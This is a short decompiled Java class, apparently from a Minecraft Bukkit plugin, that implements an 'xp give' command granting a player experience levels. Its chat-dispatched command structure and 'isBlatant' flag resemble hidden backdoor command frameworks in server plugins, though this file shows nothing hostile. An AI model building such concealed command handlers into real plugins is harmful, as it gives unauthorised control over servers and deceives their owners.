/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.entity.Player;

public class XpCommand
extends Command {
    private int Mc;

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("xp give <amount>"));
        } else if (args[1].equalsIgnoreCase("give")) {
            try {
                this.Mc = Integer.parseInt(args[2]);
            }
            catch (NumberFormatException ex2) {
                p2.sendMessage(Settings.PREFIX("The amount has to be a number"));
                return;
            }
            p2.giveExpLevels(this.Mc);
            p2.sendMessage("You have been given " + Settings.RED + this.Mc + " XP level");
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

